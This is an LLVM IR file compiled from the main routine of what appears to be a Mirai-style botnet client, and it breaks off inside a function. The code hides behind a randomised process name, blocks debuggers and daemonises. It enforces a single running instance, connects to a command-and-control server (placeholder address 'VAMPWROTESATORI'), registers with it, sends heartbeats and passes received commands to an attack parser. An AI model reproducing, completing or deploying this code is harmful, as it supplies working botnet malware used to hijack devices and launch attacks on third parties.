; ModuleID = 'main.c'
source_filename = "main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.__sigset_t = type { [16 x i64] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }

@fd_ctrl = dso_local global i32 -1, align 4
@fd_serv = dso_local global i32 -1, align 4
@ioctl_pid = dso_local global i32 0, align 4
@pending_connection = dso_local global i8 0, align 1
@resolve_func = dso_local global void ()* bitcast (i32 ()* @util_local_addr to void ()*), align 8
@LOCAL_ADDR = dso_local global i32 0, align 4
@srv_addr = dso_local global %struct.sockaddr_in zeroinitializer, align 4
@.str = private unnamed_addr constant [16 x i8] c"VAMPWROTESATORI\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"\00\00\00\01\00", align 1
@ensure_single_instance.local_bind = internal global i8 1, align 1

declare i32 @util_local_addr() #0

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #1 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [32 x i8], align 16
  %8 = alloca [32 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.__sigset_t, align 8
  %14 = alloca %struct.fd_set, align 8
  %15 = alloca %struct.fd_set, align 8
  %16 = alloca %struct.fd_set, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set*, align 8
  %22 = alloca i32, align 4
  %23 = alloca %struct.fd_set*, align 8
  %24 = alloca i16, align 2
  %25 = alloca %struct.sockaddr_in, align 4
  %26 = alloca i32, align 4
  %27 = alloca %union.__SOCKADDR_ARG, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8, align 1
  %31 = alloca i32, align 4
  %32 = alloca i16, align 2
  %33 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %34 = call i32 @sigemptyset(%struct.__sigset_t* %13) #5
  %35 = call i32 @sigaddset(%struct.__sigset_t* %13, i32 2) #5
  %36 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %13, %struct.__sigset_t* null) #5
  %37 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  %38 = call void (i32)* @signal(i32 5, void (i32)* @anti_gdb_entry) #5
  %39 = call i32 @util_local_addr()
  store i32 %39, i32* @LOCAL_ADDR, align 4
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 0), align 4
  %40 = call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0)) #5
  store i32 %40, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 2, i32 0), align 4
  %41 = call zeroext i16 @htons(i16 zeroext 3829) #6
  store i16 %41, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 1), align 2
  call void @table_init()
  call void @anti_gdb_entry(i32 0)
  call void @ensure_single_instance()
  call void @rand_init()
  %42 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  call void @util_zero(i8* %42, i32 32)
  %43 = load i32, i32* %4, align 4
  %44 = icmp eq i32 %43, 2
  br i1 %44, label %45, label %64

45:                                               ; preds = %2
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 1
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @util_strlen(i8* %48)
  %50 = icmp slt i32 %49, 32
  br i1 %50, label %51, label %64

51:                                               ; preds = %45
  %52 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %53 = load i8**, i8*** %5, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @util_strcpy(i8* %52, i8* %55)
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 1
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @util_strlen(i8* %62)
  call void @util_zero(i8* %59, i32 %63)
  br label %64

64:                                               ; preds = %51, %45, %2
  %65 = call i32 @rand_next()
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @util_strlen(i8* %68)
  %70 = sub nsw i32 20, %69
  %71 = urem i32 %65, %70
  %72 = load i8**, i8*** %5, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 0
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @util_strlen(i8* %74)
  %76 = add i32 %71, %75
  store i32 %76, i32* %9, align 4
  %77 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %78 = load i32, i32* %9, align 4
  call void @rand_alpha_str(i8* %77, i32 %78)
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %80
  store i8 0, i8* %81, align 1
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 0
  %84 = load i8*, i8** %83, align 8
  %85 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %86 = call i32 @util_strcpy(i8* %84, i8* %85)
  %87 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  call void @util_zero(i8* %87, i32 32)
  %88 = call i32 @rand_next()
  %89 = load i8**, i8*** %5, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 0
  %91 = load i8*, i8** %90, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = sub nsw i32 20, %92
  %94 = urem i32 %88, %93
  %95 = load i8**, i8*** %5, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 0
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @util_strlen(i8* %97)
  %99 = add i32 %94, %98
  store i32 %99, i32* %9, align 4
  %100 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %101 = load i32, i32* %9, align 4
  call void @rand_alpha_str(i8* %100, i32 %101)
  %102 = load i32, i32* %9, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %103
  store i8 0, i8* %104, align 1
  %105 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %106 = call i32 (i32, ...) @prctl(i32 15, i8* %105) #5
  call void @table_unlock_val(i8 zeroext 3)
  %107 = call i8* @table_retrieve_val(i32 3, i32* %10)
  store i8* %107, i8** %6, align 8
  %108 = load i8*, i8** %6, align 8
  %109 = load i32, i32* %10, align 4
  %110 = sext i32 %109 to i64
  %111 = call i64 @write(i32 1, i8* %108, i64 %110)
  %112 = call i64 @write(i32 1, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0), i64 1)
  call void @table_lock_val(i8 zeroext 3)
  %113 = call i32 @fork() #5
  %114 = icmp sgt i32 %113, 0
  br i1 %114, label %115, label %116

115:                                              ; preds = %64
  ret i32 0

116:                                              ; preds = %64
  %117 = call i32 @setsid() #5
  store i32 %117, i32* %11, align 4
  %118 = call i32 @close(i32 0)
  %119 = call i32 @close(i32 1)
  %120 = call i32 @close(i32 2)
  %121 = call signext i8 @attack_init()
  br label %122

122:                                              ; preds = %116, %216, %350, %356, %361, %371, %396, %402, %423
  br label %123

123:                                              ; preds = %122
  store %struct.fd_set* %14, %struct.fd_set** %21, align 8
  store i32 0, i32* %20, align 4
  br label %124

124:                                              ; preds = %134, %123
  %125 = load i32, i32* %20, align 4
  %126 = zext i32 %125 to i64
  %127 = icmp ult i64 %126, 16
  br i1 %127, label %128, label %137

128:                                              ; preds = %124
  %129 = load %struct.fd_set*, %struct.fd_set** %21, align 8
  %130 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %129, i32 0, i32 0
  %131 = load i32, i32* %20, align 4
  %132 = zext i32 %131 to i64
  %133 = getelementptr inbounds [16 x i64], [16 x i64]* %130, i64 0, i64 %132
  store i64 0, i64* %133, align 8
  br label %134

134:                                              ; preds = %128
  %135 = load i32, i32* %20, align 4
  %136 = add i32 %135, 1
  store i32 %136, i32* %20, align 4
  br label %124, !llvm.loop !6

137:                                              ; preds = %124
  br label %138

138:                                              ; preds = %137
  br label %139

139:                                              ; preds = %138
  store %struct.fd_set* %15, %struct.fd_set** %23, align 8
  store i32 0, i32* %22, align 4
  br label %140

140:                                              ; preds = %150, %139
  %141 = load i32, i32* %22, align 4
  %142 = zext i32 %141 to i64
  %143 = icmp ult i64 %142, 16
  br i1 %143, label %144, label %153

144:                                              ; preds = %140
  %145 = load %struct.fd_set*, %struct.fd_set** %23, align 8
  %146 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %145, i32 0, i32 0
  %147 = load i32, i32* %22, align 4
  %148 = zext i32 %147 to i64
  %149 = getelementptr inbounds [16 x i64], [16 x i64]* %146, i64 0, i64 %148
  store i64 0, i64* %149, align 8
  br label %150

150:                                              ; preds = %144
  %151 = load i32, i32* %22, align 4
  %152 = add i32 %151, 1
  store i32 %152, i32* %22, align 4
  br label %140, !llvm.loop !8

153:                                              ; preds = %140
  br label %154

154:                                              ; preds = %153
  %155 = load i32, i32* @fd_ctrl, align 4
  %156 = icmp ne i32 %155, -1
  br i1 %156, label %157, label %169

157:                                              ; preds = %154
  %158 = load i32, i32* @fd_ctrl, align 4
  %159 = srem i32 %158, 64
  %160 = zext i32 %159 to i64
  %161 = shl i64 1, %160
  %162 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %163 = load i32, i32* @fd_ctrl, align 4
  %164 = sdiv i32 %163, 64
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds [16 x i64], [16 x i64]* %162, i64 0, i64 %165
  %167 = load i64, i64* %166, align 8
  %168 = or i64 %167, %161
  store i64 %168, i64* %166, align 8
  br label %169

169:                                              ; preds = %157, %154
  %170 = load i32, i32* @fd_serv, align 4
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %173

172:                                              ; preds = %169
  call void @establish_connection()
  br label %173

173:                                              ; preds = %172, %169
  %174 = load i8, i8* @pending_connection, align 1
  %175 = icmp ne i8 %174, 0
  br i1 %175, label %176, label %188

176:                                              ; preds = %173
  %177 = load i32, i32* @fd_serv, align 4
  %178 = srem i32 %177, 64
  %179 = zext i32 %178 to i64
  %180 = shl i64 1, %179
  %181 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %15, i32 0, i32 0
  %182 = load i32, i32* @fd_serv, align 4
  %183 = sdiv i32 %182, 64
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [16 x i64], [16 x i64]* %181, i64 0, i64 %184
  %186 = load i64, i64* %185, align 8
  %187 = or i64 %186, %180
  store i64 %187, i64* %185, align 8
  br label %200

188:                                              ; preds = %173
  %189 = load i32, i32* @fd_serv, align 4
  %190 = srem i32 %189, 64
  %191 = zext i32 %190 to i64
  %192 = shl i64 1, %191
  %193 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %194 = load i32, i32* @fd_serv, align 4
  %195 = sdiv i32 %194, 64
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds [16 x i64], [16 x i64]* %193, i64 0, i64 %196
  %198 = load i64, i64* %197, align 8
  %199 = or i64 %198, %192
  store i64 %199, i64* %197, align 8
  br label %200

200:                                              ; preds = %188, %176
  %201 = load i32, i32* @fd_ctrl, align 4
  %202 = load i32, i32* @fd_serv, align 4
  %203 = icmp sgt i32 %201, %202
  br i1 %203, label %204, label %206

204:                                              ; preds = %200
  %205 = load i32, i32* @fd_ctrl, align 4
  store i32 %205, i32* %18, align 4
  br label %208

206:                                              ; preds = %200
  %207 = load i32, i32* @fd_serv, align 4
  store i32 %207, i32* %18, align 4
  br label %208

208:                                              ; preds = %206, %204
  %209 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %209, align 8
  %210 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 10, i64* %210, align 8
  %211 = load i32, i32* %18, align 4
  %212 = add nsw i32 %211, 1
  %213 = call i32 @select(i32 %212, %struct.fd_set* %14, %struct.fd_set* %15, %struct.fd_set* null, %struct.timeval* %17)
  store i32 %213, i32* %19, align 4
  %214 = load i32, i32* %19, align 4
  %215 = icmp eq i32 %214, -1
  br i1 %215, label %216, label %217

216:                                              ; preds = %208
  br label %122

217:                                              ; preds = %208
  %218 = load i32, i32* %19, align 4
  %219 = icmp eq i32 %218, 0
  br i1 %219, label %220, label %230

220:                                              ; preds = %217
  store i16 0, i16* %24, align 2
  %221 = load i32, i32* %12, align 4
  %222 = add nsw i32 %221, 1
  store i32 %222, i32* %12, align 4
  %223 = srem i32 %221, 6
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %225, label %229

225:                                              ; preds = %220
  %226 = load i32, i32* @fd_serv, align 4
  %227 = bitcast i16* %24 to i8*
  %228 = call i64 @send(i32 %226, i8* %227, i64 2, i32 16384)
  br label %229

229:                                              ; preds = %225, %220
  br label %230

230:                                              ; preds = %229, %217
  br label %231

231:                                              ; preds = %230
  %232 = load i32, i32* @fd_ctrl, align 4
  %233 = icmp ne i32 %232, -1
  br i1 %233, label %234, label %263

234:                                              ; preds = %231
  %235 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %236 = load i32, i32* @fd_ctrl, align 4
  %237 = sdiv i32 %236, 64
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds [16 x i64], [16 x i64]* %235, i64 0, i64 %238
  %240 = load i64, i64* %239, align 8
  %241 = load i32, i32* @fd_ctrl, align 4
  %242 = srem i32 %241, 64
  %243 = zext i32 %242 to i64
  %244 = shl i64 1, %243
  %245 = and i64 %240, %244
  %246 = icmp ne i64 %245, 0
  br i1 %246, label %247, label %263

247:                                              ; preds = %234
  store i32 16, i32* %26, align 4
  %248 = load i32, i32* @fd_ctrl, align 4
  %249 = bitcast %union.__SOCKADDR_ARG* %27 to %struct.sockaddr**
  %250 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  store %struct.sockaddr* %250, %struct.sockaddr** %249, align 8
  %251 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %27, i32 0, i32 0
  %252 = load %struct.sockaddr*, %struct.sockaddr** %251, align 8
  %253 = call i32 @accept(i32 %248, %struct.sockaddr* %252, i32* %26)
  %254 = load i32, i32* %11, align 4
  %255 = mul nsw i32 %254, -1
  %256 = call i32 @kill(i32 %255, i32 9) #5
  %257 = load i32, i32* @ioctl_pid, align 4
  %258 = icmp ne i32 %257, 0
  br i1 %258, label %259, label %262

259:                                              ; preds = %247
  %260 = load i32, i32* @ioctl_pid, align 4
  %261 = call i32 @kill(i32 %260, i32 9) #5
  br label %262

262:                                              ; preds = %259, %247
  call void @exit(i32 0) #7
  unreachable

263:                                              ; preds = %234, %231
  %264 = load i8, i8* @pending_connection, align 1
  %265 = icmp ne i8 %264, 0
  br i1 %265, label %266, label %314

266:                                              ; preds = %263
  store i8 0, i8* @pending_connection, align 1
  %267 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %15, i32 0, i32 0
  %268 = load i32, i32* @fd_serv, align 4
  %269 = sdiv i32 %268, 64
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds [16 x i64], [16 x i64]* %267, i64 0, i64 %270
  %272 = load i64, i64* %271, align 8
  %273 = load i32, i32* @fd_serv, align 4
  %274 = srem i32 %273, 64
  %275 = zext i32 %274 to i64
  %276 = shl i64 1, %275
  %277 = and i64 %272, %276
  %278 = icmp ne i64 %277, 0
  br i1 %278, label %280, label %279

279:                                              ; preds = %266
  call void @teardown_connection()
  br label %313

280:                                              ; preds = %266
  store i32 0, i32* %28, align 4
  store i32 4, i32* %29, align 4
  %281 = load i32, i32* @fd_serv, align 4
  %282 = bitcast i32* %28 to i8*
  %283 = call i32 @getsockopt(i32 %281, i32 1, i32 4, i8* %282, i32* %29) #5
  %284 = load i32, i32* %28, align 4
  %285 = icmp ne i32 %284, 0
  br i1 %285, label %286, label %293

286:                                              ; preds = %280
  %287 = load i32, i32* @fd_serv, align 4
  %288 = call i32 @close(i32 %287)
  store i32 -1, i32* @fd_serv, align 4
  %289 = call i32 @rand_next()
  %290 = urem i32 %289, 10
  %291 = add i32 %290, 1
  %292 = call i32 @sleep(i32 %291)
  br label %312

293:                                              ; preds = %280
  %294 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %295 = call i32 @util_strlen(i8* %294)
  %296 = trunc i32 %295 to i8
  store i8 %296, i8* %30, align 1
  %297 = call i32 @util_local_addr()
  store i32 %297, i32* @LOCAL_ADDR, align 4
  %298 = load i32, i32* @fd_serv, align 4
  %299 = call i64 @send(i32 %298, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i64 4, i32 16384)
  %300 = load i32, i32* @fd_serv, align 4
  %301 = call i64 @send(i32 %300, i8* %30, i64 1, i32 16384)
  %302 = load i8, i8* %30, align 1
  %303 = zext i8 %302 to i32
  %304 = icmp sgt i32 %303, 0
  br i1 %304, label %305, label %311

305:                                              ; preds = %293
  %306 = load i32, i32* @fd_serv, align 4
  %307 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %308 = load i8, i8* %30, align 1
  %309 = zext i8 %308 to i64
  %310 = call i64 @send(i32 %306, i8* %307, i64 %309, i32 16384)
  br label %311

311:                                              ; preds = %305, %293
  br label %312

312:                                              ; preds = %311, %286
  br label %313

313:                                              ; preds = %312, %279
  br label %423

314:                                              ; preds = %263
  %315 = load i32, i32* @fd_serv, align 4
  %316 = icmp ne i32 %315, -1
  br i1 %316, label %317, label %422

317:                                              ; preds = %314
  %318 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %319 = load i32, i32* @fd_serv, align 4
  %320 = sdiv i32 %319, 64
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds [16 x i64], [16 x i64]* %318, i64 0, i64 %321
  %323 = load i64, i64* %322, align 8
  %324 = load i32, i32* @fd_serv, align 4
  %325 = srem i32 %324, 64
  %326 = zext i32 %325 to i64
  %327 = shl i64 1, %326
  %328 = and i64 %323, %327
  %329 = icmp ne i64 %328, 0
  br i1 %329, label %330, label %422

330:                                              ; preds = %317
  store i32 0, i32* %31, align 4
  store i16 0, i16* %32, align 2
  %331 = call i32* @__errno_location() #6
  store i32 0, i32* %331, align 4
  %332 = load i32, i32* @fd_serv, align 4
  %333 = bitcast i16* %32 to i8*
  %334 = call i64 @recv(i32 %332, i8* %333, i64 2, i32 16386)
  %335 = trunc i64 %334 to i32
  store i32 %335, i32* %31, align 4
  %336 = load i32, i32* %31, align 4
  %337 = icmp eq i32 %336, -1
  br i1 %337, label %338, label %353

338:                                              ; preds = %330
  %339 = call i32* @__errno_location() #6
  %340 = load i32, i32* %339, align 4
  %341 = icmp eq i32 %340, 11
  br i1 %341, label %350, label %342

342:                                              ; preds = %338
  %343 = call i32* @__errno_location() #6
  %344 = load i32, i32* %343, align 4
  %345 = icmp eq i32 %344, 11
  br i1 %345, label %350, label %346

346:                                              ; preds = %342
  %347 = call i32* @__errno_location() #6
  %348 = load i32, i32* %347, align 4
  %349 = icmp eq i32 %348, 4
  br i1 %349, label %350, label %351

350:                                              ; preds = %346, %342, %338
  br label %122

351:                                              ; preds = %346
  store i32 0, i32* %31, align 4
  br label %352

352:                                              ; preds = %351
  br label %353

353:                                              ; preds = %352, %330
  %354 = load i32, i32* %31, align 4
  %355 = icmp eq i32 %354, 0
  br i1 %355, label %356, label %357

356:                                              ; preds = %353
  call void @teardown_connection()
  br label %122

357:                                              ; preds = %353
  %358 = load i16, i16* %32, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 0
  br i1 %360, label %361, label %365

361:                                              ; preds = %357
  %362 = load i32, i32* @fd_serv, align 4
  %363 = bitcast i16* %32 to i8*
  %364 = call i64 @recv(i32 %362, i8* %363, i64 2, i32 16384)
  br label %122

365:                                              ; preds = %357
  %366 = load i16, i16* %32, align 2
  %367 = call zeroext i16 @ntohs(i16 zeroext %366) #6
  store i16 %367, i16* %32, align 2
  %368 = load i16, i16* %32, align 2
  %369 = zext i16 %368 to i64
  %370 = icmp ugt i64 %369, 1024
  br i1 %370, label %371, label %374

371:                                              ; preds = %365
  %372 = load i32, i32* @fd_serv, align 4
  %373 = call i32 @close(i32 %372)
  store i32 -1, i32* @fd_serv, align 4
  br label %122

374:                                              ; preds = %365
  %375 = call i32* @__errno_location() #6
  store i32 0, i32* %375, align 4
  %376 = load i32, i32* @fd_serv, align 4
  %377 = getelementptr inbounds [1024 x i8], [1024 x i8]* %33, i64 0, i64 0
  %378 = load i16, i16* %32, align 2
  %379 = zext i16 %378 to i64
  %380 = call i64 @recv(i32 %376, i8* %377, i64 %379, i32 16386)
  %381 = trunc i64 %380 to i32
  store i32 %381, i32* %31, align 4
  %382 = load i32, i32* %31, align 4
  %383 = icmp eq i32 %382, -1
  br i1 %383, label %384, label %399

384:                                              ; preds = %374
  %385 = call i32* @__errno_location() #6
  %386 = load i32, i32* %385, align 4
  %387 = icmp eq i32 %386, 11
  br i1 %387, label %396, label %388

388:                                              ; preds = %384
  %389 = call i32* @__errno_location() #6
  %390 = load i32, i32* %389, align 4
  %391 = icmp eq i32 %390, 11
  br i1 %391, label %396, label %392

392:                                              ; preds = %388
  %393 = call i32* @__errno_location() #6
  %394 = load i32, i32* %393, align 4
  %395 = icmp eq i32 %394, 4
  br i1 %395, label %396, label %397

396:                                              ; preds = %392, %388, %384
  br label %122

397:                                              ; preds = %392
  store i32 0, i32* %31, align 4
  br label %398

398:                                              ; preds = %397
  br label %399

399:                                              ; preds = %398, %374
  %400 = load i32, i32* %31, align 4
  %401 = icmp eq i32 %400, 0
  br i1 %401, label %402, label %403

402:                                              ; preds = %399
  call void @teardown_connection()
  br label %122

403:                                              ; preds = %399
  %404 = load i32, i32* @fd_serv, align 4
  %405 = bitcast i16* %32 to i8*
  %406 = call i64 @recv(i32 %404, i8* %405, i64 2, i32 16384)
  %407 = load i16, i16* %32, align 2
  %408 = call zeroext i16 @ntohs(i16 zeroext %407) #6
  store i16 %408, i16* %32, align 2
  %409 = load i32, i32* @fd_serv, align 4
  %410 = getelementptr inbounds [1024 x i8], [1024 x i8]* %33, i64 0, i64 0
  %411 = load i16, i16* %32, align 2
  %412 = zext i16 %411 to i64
  %413 = call i64 @recv(i32 %409, i8* %410, i64 %412, i32 16384)
  %414 = load i16, i16* %32, align 2
  %415 = zext i16 %414 to i32
  %416 = icmp sgt i32 %415, 0
  br i1 %416, label %417, label %421

417:                                              ; preds = %403
  %418 = getelementptr inbounds [1024 x i8], [1024 x i8]* %33, i64 0, i64 0
  %419 = load i16, i16* %32, align 2
  %420 = zext i16 %419 to i32
  call void @attack_parse(i8* %418, i32 %420)
  br label %421

421:                                              ; preds = %417, %403
  br label %422

422:                                              ; preds = %421, %317, %314
  br label %423

423:                                              ; preds = %422, %313
  br label %122
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #2

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #2

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #2

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @anti_gdb_entry(i32 %0) #1 {
  %2 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store void ()* @resolve_cnc_addr, void ()** @resolve_func, align 8
  ret void
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #3

declare void @table_init() #0

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @ensure_single_instance() #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  %3 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 1, i32* %2, align 4
  %5 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %5, i32* @fd_ctrl, align 4
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %7, label %8

7:                                                ; preds = %0
  br label %72

8:                                                ; preds = %0
  %9 = load i32, i32* @fd_ctrl, align 4
  %10 = bitcast i32* %2 to i8*
  %11 = call i32 @setsockopt(i32 %9, i32 1, i32 2, i8* %10, i32 4) #5
  %12 = load i32, i32* @fd_ctrl, align 4
  %13 = load i32, i32* @fd_ctrl, align 4
  %14 = call i32 (i32, i32, ...) @fcntl(i32 %13, i32 3, i32 0)
  %15 = or i32 2048, %14
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %12, i32 4, i32 %15)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %23

21:                                               ; preds = %8
  %22 = call i32 @htonl(i32 2130706433) #6
  br label %25

23:                                               ; preds = %8
  %24 = load i32, i32* @LOCAL_ADDR, align 4
  br label %25

25:                                               ; preds = %23, %21
  %26 = phi i32 [ %22, %21 ], [ %24, %23 ]
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %28 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %27, i32 0, i32 0
  store i32 %26, i32* %28, align 4
  %29 = call zeroext i16 @htons(i16 zeroext 9473) #6
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  %31 = call i32* @__errno_location() #6
  store i32 0, i32* %31, align 4
  %32 = load i32, i32* @fd_ctrl, align 4
  %33 = bitcast %union.__CONST_SOCKADDR_ARG* %3 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %3, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @bind(i32 %32, %struct.sockaddr* %36, i32 16) #5
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %66

39:                                               ; preds = %25
  %40 = call i32* @__errno_location() #6
  %41 = load i32, i32* %40, align 4
  %42 = icmp eq i32 %41, 99
  br i1 %42, label %43, label %48

43:                                               ; preds = %39
  %44 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %45 = sext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %48

47:                                               ; preds = %43
  store i8 0, i8* @ensure_single_instance.local_bind, align 1
  br label %48

48:                                               ; preds = %47, %43, %39
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %49, align 4
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %51 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %50, i32 0, i32 0
  store i32 0, i32* %51, align 4
  %52 = call zeroext i16 @htons(i16 zeroext 9473) #6
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %52, i16* %53, align 2
  %54 = load i32, i32* @fd_ctrl, align 4
  %55 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %56 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %56, %struct.sockaddr** %55, align 8
  %57 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %58 = load %struct.sockaddr*, %struct.sockaddr** %57, align 8
  %59 = call i32 @connect(i32 %54, %struct.sockaddr* %58, i32 16)
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %62

61:                                               ; preds = %48
  br label %62

62:                                               ; preds = %61, %48
  %63 = call i32 @sleep(i32 5)
  %64 = load i32, i32* @fd_ctrl, align 4
  %65 = call i32 @close(i32 %64)
  call void @ensure_single_instance()
